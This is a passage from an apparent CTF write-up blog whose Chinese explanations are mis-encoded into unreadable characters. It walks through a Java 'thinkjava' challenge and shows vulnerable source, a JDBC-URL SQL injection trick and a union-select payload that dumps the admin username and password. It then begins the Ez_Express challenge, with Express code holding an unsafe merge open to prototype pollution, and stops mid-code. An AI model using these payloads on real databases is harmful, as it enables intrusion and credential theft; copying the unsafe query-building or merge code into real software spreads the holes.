isNull, String isAuto, String remark, String isPK, String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.def = def;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//sqlDict.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlDict</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SqlDict</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>            <span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                user = <span class="hljs-string">&quot;root&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (pass == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                pass = <span class="hljs-string">&quot;abc@12345&quot;</span>;<br>            &#125;<br><br>            conn = DriverManager.getConnection(dbName, user, pass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var6) &#123;<br>            var6.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> conn;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Table&gt; <span class="hljs-title function_">getTableData</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        List&lt;Table&gt; Tables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dbName, user, pass);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">TableName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> conn.getMetaData();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> metaData.getTables((String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;TABLE&quot;</span>&#125;);<br><br>            <span class="hljs-keyword">while</span>(tableNames.next()) &#123;<br>                TableName = tableNames.getString(<span class="hljs-number">3</span>);<br>                <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br><br>                <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>                    table.setTableDescribe(rs.getString(<span class="hljs-string">&quot;TABLE_COMMENT&quot;</span>));<br>                &#125;<br><br>                table.setTableName(TableName);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs2</span> <span class="hljs-operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName);<br><br>                String PK;<br>                <span class="hljs-keyword">for</span>(PK = <span class="hljs-string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="hljs-number">4</span>)) &#123;<br>                &#125;<br><br>                <span class="hljs-keyword">while</span>(data.next()) &#123;<br>                    <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Row</span>(data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="hljs-string">&quot;NULLABLE&quot;</span>).equals(<span class="hljs-string">&quot;1&quot;</span>) ? <span class="hljs-string">&quot;YES&quot;</span> : <span class="hljs-string">&quot;NO&quot;</span>, data.getString(<span class="hljs-string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="hljs-string">&quot;REMARKS&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-literal">null</span>, data.getString(<span class="hljs-string">&quot;COLUMN_SIZE&quot;</span>));<br>                    table.list.add(row);<br>                &#125;<br><br>                Tables.add(table);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var16) &#123;<br>            var16.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Tables;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//table.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span> &#123;<br>    String tableName;<br>    String tableDescribe;<br>    List&lt;Row&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Table</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableDescribe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableDescribe</span><span class="hljs-params">(String tableDescribe)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableDescribe = tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableName</span><span class="hljs-params">(String tableName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableName = tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Row&gt; <span class="hljs-title function_">getList</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setList</span><span class="hljs-params">(List&lt;Row&gt; list)</span> &#123;<br>        <span class="hljs-built_in">this</span>.list = list;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/RABCDXB/article/details/124003575">å‚è€ƒæ–‡ç« </a></p><p><a href="https://guokeya.github.io/post/u6ks9KJMm/">å‚è€ƒæ–‡ç« </a></p><p>é¦–å…ˆæ˜¯è¿™éƒ¨åˆ†ï¼Œå­˜åœ¨<code>SQL</code>æ³¨å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>      &#125; <br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>å…¶å®æ­£å¸¸<code>SQL</code>æ³¨å…¥è‚¯å®šæƒ³ç€ç”¨æ³¨é‡Šå·å»æ³¨é‡ŠæŸéƒ¨åˆ†<code>SQL</code>è¯­å¥ï¼Œå¯¹äº<code>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#39;&quot; + dbName + &quot;&#39; and table_name=&#39;&quot; + TableName + &quot;&#39;;</code>è¿™ä¸ª<code>SQL</code>è¯­å¥è‚¯å®šæƒ³ç€<code>dbName</code>æ˜¯æ³¨å…¥ç‚¹ï¼Œä½†<code>dbName</code>è¿™ä¸œè¥¿è¿˜ä¼šå¸¦å…¥åˆ°<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code>è¿™ä¸ªèµ‹å€¼è¯­å¥é‡Œã€‚</p><p>jdbcç±»ä¼¼URLè§£æã€‚æ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥<code>myapp#&#39; union select 1#</code>æ—¶ï¼Œ <code>#</code>åœ¨URLä¸­æ˜¯é”šç‚¹ã€‚æ‰€ä»¥æœ‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://mysqldbserver:3306/myapp<span class="hljs-comment">#&#x27; union select 1#</span><br>ä¼šè¢«è§£ææˆ<br>jdbc:mysql://mysqldbserver:3306/myapp<br><br>å†å¸¦å…¥sqlè¯­å¥<br>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = <span class="hljs-string">&#x27;å‰å‰å‰#&#x27;</span> union <span class="hljs-keyword">select</span> 1<span class="hljs-comment">#&#x27; and table_name=&#x27;&quot; + TableName + &quot;&#x27;</span><br>å‚è€ƒæ–‡ç« é‡Œå¯¹ç¬¬ä¸€ä¸ª<span class="hljs-comment">#å·çš„è§£é‡Šæ˜¯å› ä¸ºè¢«å¼•å·åŒ…è£¹äº†æ‰€ä»¥è¢«è®¤ä¸ºæ˜¯æ™®é€šå­—ç¬¦ï¼š</span><br>ç¬¬ä¸€ä¸ª<span class="hljs-comment">#è¢«å•å¼•å·åŒ…è£¹ã€‚æˆäº†æ™®é€šçš„#å­—ç¬¦ã€‚ç¬¬äºŒä¸ª#æ³¨é‡Šæ‰äº†åé¢çš„è¯­å¥ã€‚é€ æˆsqlæ³¨å…¥</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™é‡Œç”¨<code>?</code>ä¹Ÿè¡Œï¼Œæ¯”å¦‚(ä¸è¿‡æ³¨æ„ç”¨äº†?ä¸€å®šè¦æˆé”®å€¼å¯¹)ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jdbc</span>:mysql://localhost:<span class="hljs-number">3306</span>/myapp?a=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯<code>import io.swagger.annotations.ApiOperation;</code>è¿™ä¸ªä¸œè¥¿ï¼š</p><blockquote><p>swagger æä¾›äº†ä¸€ä¸ªç”¨äºæµè§ˆå’Œæµ‹è¯• API çš„äº¤äº’å¼ç”¨æˆ·ç•Œé¢ï¼Œé€šå¸¸ç§°ä¸º Swagger UIã€‚å½“ä½ åœ¨åº”ç”¨ç¨‹åºä¸­é›†æˆäº† Swaggerï¼Œå¹¶å¯åŠ¨åº”ç”¨ç¨‹åºæ—¶ï¼ŒSwagger UI å°†åœ¨ <code>/swagger-ui.html</code> è·¯å¾„ä¸Šæä¾›ä¸€ä¸ªå¯è§†åŒ–çš„ç•Œé¢ï¼Œå±•ç¤ºäº†ä½ çš„ API çš„å„ç§ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¥å£ã€å‚æ•°ã€å“åº”ç­‰ã€‚</p></blockquote><p>è®¿é—®ï¼Œä¸‰ä¸ªè·¯ç”±ï¼š</p><p><img src="/img/wdbthinkjava1.png" alt="wdbthinkjava1"></p><p><img src="/img/wdbthinkjava2.png" alt="wdbthinkjava2"></p><p>åé¢å°±æ˜¯çˆ†åº“æŠ¥è¡¨çˆ†åˆ—ï¼Œè¿™é‡Œä¸è¯¦ç»†è¯´äº†ï¼Œæœ€åçˆ†ç”¨æˆ·åå’Œå¯†ç çš„<code>payload</code>:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">dbName=myapp#&#x27; union <span class="hljs-keyword">select</span> group_concat(name,<span class="hljs-number">0x7e</span>,pwd)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">user</span>)#<br>å¾—åˆ°ï¼š<br>admin~admin@Rrrr_ctf_asde<br></code></pre></td></tr></table></figure><p>æˆ‘çœ‹ç½‘ä¸Šå¾ˆå¤š<code>wp</code>éƒ½ç›´æ¥åœ¨<code>swagger</code>é‚£é‡Œæ“ä½œäº†ã€‚ã€‚ä½†æˆ‘è¿™ä¸ªä¸è¡Œï¼Œåªå¥½ç”¨burpæŠ“åŒ…ä¿®æ”¹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@Rrrr_ctf_asde&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdbthinkjava4.png" alt="wdbthinkjava4"></p><p>ä¸‹é¢è¦æŠŠè¿™ä¸œè¥¿æ”¾åˆ°<code>/common/user/current</code>è·¯ç”±è®¤è¯ä¸€ä¸‹ï¼Œæˆ‘çš„ç¯å¢ƒæœ‰é—®é¢˜å°±ç”¨å…¶å®ƒå¸ˆå‚…çš„å›¾äº†ï¼š</p><p><img src="/img/wdbthinkjava5.png" alt="wdbthinkjava5"></p><p>æ¥ä¸‹æ¥æ˜¯å¯¹è¿™ä¸ªå­—ç¬¦ä¸²çš„åˆ†æï¼š</p><blockquote><p>ä¸€æ®µæ•°æ®ä»¥rO0ABå¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯Javaåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚<br> æˆ–è€…å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µJavaåºåˆ—åŒ–çš„16è¿›åˆ¶ã€‚</p></blockquote><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code>æ³„éœ²ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//index.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>(); <br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(a[attr]) &amp;&amp; <span class="hljs-title function_">isObject</span>(b[attr])) &#123;<br>      <span class="hljs-title function_">merge</span>(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">clone</span> = (<span class="hljs-params">a</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, a);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>&#125;);<br>&#125;);<br><br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>==req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>&amp;&amp;req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>==req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">passwd</span>)&#123;<br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">isLogin</span>=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><br><span class="hljs-comment">//app.js</span><br><span class="hljs-keyword">var</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> indexRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// view engine setup</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">disable</span>(<span class="hljs-string">&#x27;etag&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title 